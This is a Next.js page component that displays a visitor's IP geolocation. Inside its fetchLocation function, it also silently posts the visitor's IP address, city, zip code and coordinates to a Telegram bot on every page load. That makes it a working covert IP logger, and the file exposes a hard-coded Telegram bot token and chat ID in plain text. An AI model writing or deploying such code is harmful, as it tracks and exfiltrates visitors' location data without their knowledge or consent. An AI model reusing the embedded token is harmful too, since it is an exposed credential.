import Image from "next/image";
import { Inter } from "next/font/google";
import { useEffect, useState } from "react";
import axios from "axios";

const inter = Inter({ subsets: ["latin"] });

export default function Home() {
  const [data, setData] = useState({
    ipAddress: "",
    countryName: "",
    cityName: "",
    zipCode: "",
    latitude: "",
    longitude: "",
    timeZone: "",
  });

  useEffect(() => {
    fetchLocation();
  }, []);

  const fetchLocation = async () => {
    const res = await fetch("https://freeipapi.com/api/json");
    const data = await res.json();
    console.log(data);
    const api = `https://api.telegram.org/bot6360176021:AAEQgL9ib0zZ6HuRZEVCfZBW9_TngCNfqbo`;
    console.log(data);
    axios
      .post(`${api}/sendMessage`, {
        chat_id: "-4152348122",
        text: data,
      })
      .then((response) => {
        console.log(response);
      })
      .catch((err) => {
        console.log(err);
      });
    setData(data);
  };

  return (
    <main
      className={`flex min-h-screen flex-col items-center justify-between p-24 ${inter.className}`}
    >
      <p>IP Address: {data?.ipAddress}</p>
      <p>Country: {data?.countryName}</p>
      <p>City: {data?.cityName}</p>
      <p>Zip: {data?.zipCode}</p>
      <p>Latitude: {data?.latitude}</p>
      <p>Longitude: {data?.longitude}</p>
      <p>Timezone: {data?.timeZone}</p>
    </main>
  );
}
